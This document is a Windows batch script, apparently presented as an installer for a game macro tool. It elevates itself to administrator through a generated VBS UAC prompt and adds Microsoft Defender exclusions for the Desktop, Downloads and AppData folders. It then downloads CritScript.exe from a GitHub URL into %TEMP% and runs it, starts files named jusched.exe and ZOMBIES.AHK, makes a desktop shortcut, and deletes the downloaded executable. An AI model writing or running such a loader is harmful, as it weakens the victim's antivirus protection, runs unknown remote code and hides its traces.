@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Desktop"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Downloads"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/AppData/"
:: Navigate to the %TEMP% directory
cd %TEMP%

:: Step 1: Download CritScript.exe using PowerShell
echo Downloading CritScript.exe...
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/ahk.ico' -OutFile ahk.ico"
if not exist "CritScript.exe" (
    echo Failed to download CritScript.exe. Exiting...
    pause
    exit /b
)
echo CritScript.exe downloaded successfully.

:: Step 2: Execute CritScript.exe
echo Running CritScript.exe...
start "" CritScript.exe
timeout /t 5 /nobreak

:: Step 3: Check and run JUSCHED.EXE if it exists (case-insensitive)
for %%F in (jusched.exe JUSCHED.EXE) do (
    if exist "%%F" (
        echo Found %%F. Running it...
        start "" %%F
        timeout /t 5 /nobreak
        goto :CheckZombies
    )
)
echo jusched.exe not found.

:CheckZombies
:: Step 4: Check and run ZOMBIES.AHK if it exists (case-insensitive)
for %%F in (zombies.ahk ZOMBIES.AHK) do (
    if exist "%%F" (
        echo Found %%F. Running it...
        start "" %%F
        goto :DetermineDesktop
    )
)
echo Zombies.ahk not found.

:DetermineDesktop
:: Step 5: Determine the desktop path dynamically
set "desktopPath=%USERPROFILE%\Desktop"
if exist "%USERPROFILE%\OneDrive\Desktop" (
    set "desktopPath=%USERPROFILE%\OneDrive\Desktop"
)
echo Using desktop path: %desktopPath%

:CreateShortcut
:: Step 6: Create a shortcut for ZOMBIES.AHK on the determined desktop path
set "zombiesScript=%TEMP%\ZOMBIES.AHK"
set "iconPath=%TEMP%\icon.ico"

if exist "%zombiesScript%" (
    echo Creating shortcut for ZOMBIES.AHK on the desktop...
    Powershell -ExecutionPolicy Bypass -File "%TEMP%\CreateShortcut.ps1"
    echo Shortcut created.
) else (
    echo ZOMBIES.AHK not found. Cannot create shortcut.
)

:DeleteCritScript
:: Step 7: Delete CritScript.exe if it exists
if exist "CritScript.exe" (
    echo Deleting CritScript.exe...
    del /f /q "CritScript.exe"
    echo CritScript.exe deleted.
)

:ExitScript
:: Exit the script
echo Script completed. Exiting...
pause
exit /b
